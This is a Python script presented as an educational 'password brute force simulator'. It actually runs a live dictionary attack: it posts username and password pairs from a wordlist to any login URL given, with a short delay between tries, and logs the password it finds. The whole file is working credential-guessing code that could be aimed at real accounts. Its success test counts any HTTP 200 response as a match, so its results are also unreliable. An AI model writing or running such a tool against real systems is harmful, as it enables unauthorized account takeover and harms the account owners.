#!/usr/bin/env python3
"""
Password Brute Force Simulator
Simulates dictionary attacks for educational purposes.
"""

import requests
import time
from utils import logger

def try_password(url, username, password):
    """Attempt login with given credentials."""
    try:
        # This is a simulation - in real scenario, adapt to target login form
        payload = {'username': username, 'password': password}
        response = requests.post(url, data=payload, timeout=5)
        if "success" in response.text.lower() or response.status_code == 200:
            return True
    except Exception as e:
        logger.log_error(f"Error during attempt: {e}")
    return False

def run(url, username, wordlist_path):
    """Run brute force simulation."""
    logger.log_info(f"Starting brute force simulation on {url} for user {username}")

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.log_error(f"Wordlist file not found: {wordlist_path}")
        return

    attempts = 0
    for password in passwords:
        attempts += 1
        logger.log_info(f"Attempt {attempts}: Trying password '{password}'")
        if try_password(url, username, password):
            logger.log_success(f"Success! Password found: {password}")
            return password
        time.sleep(0.1)  # Simulate delay

    logger.log_info("Brute force complete. No password found.")
    return None